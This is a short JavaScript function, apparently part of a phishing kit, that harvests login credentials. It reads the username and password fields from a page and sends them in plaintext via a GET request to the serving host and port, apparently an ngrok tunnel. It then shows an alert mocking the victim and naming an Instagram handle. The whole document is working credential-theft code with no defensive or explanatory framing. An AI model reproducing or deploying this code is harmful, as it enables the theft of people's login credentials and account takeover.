function getcreds(){
    var user = document.getElementById('username').value
    var password = document.getElementById('passwd').value
    let ngrok_url = window.location.href.split(':')[1]
    let ngrok_port = parseInt(window.location.href.split(':')[2].split('/')[0])
    let url = `http:${ngrok_url}:${ngrok_port}?user=${user}&password=${password}`;
    const xhttp = new XMLHttpRequest()
    xhttp.open('GET', url, true)
    xhttp.send()
    alert('Your Data Has Been Breached ;)\nInstagram: Apkaless\n')
}